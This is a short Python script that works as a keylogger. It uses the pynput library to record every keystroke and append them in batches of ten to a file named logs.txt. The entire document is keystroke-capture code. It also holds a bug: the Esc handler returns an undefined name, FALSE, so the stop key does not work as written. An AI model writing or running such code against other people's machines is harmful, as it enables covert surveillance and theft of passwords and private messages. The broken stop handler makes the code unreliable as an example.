#!/usr/bin/python3

import pynput

count =0
Keys=[]

from pynput.keyboard import Key, Listener

def write_file(Keys):
    with open("logs.txt","a") as f:
        for key in Keys:
            k=str(key).replace("'"," ")

            #Key.space
            if k.find("space") > 0:
                f.write('\n')

            #Key.backspace
            elif k.find("Key") == -1:
                f.write(k)

def when_pressed(key):
    #print(key, "was pressed")
    global count, Keys
    Keys.append(key)
    count = count+1
    if count>=10:
        write_file(Keys)
        Keys=[]
        count=0
    print("{0} pressed".format(key))




def when_released(key):
    #print(key, "was released")
    #print("{0} released".format(key))
    if key == Key.esc:
        return FALSE

with Listener(on_press=when_pressed, on_release=when_released) as listener: #just replaced it with lower case listener
    listener.join()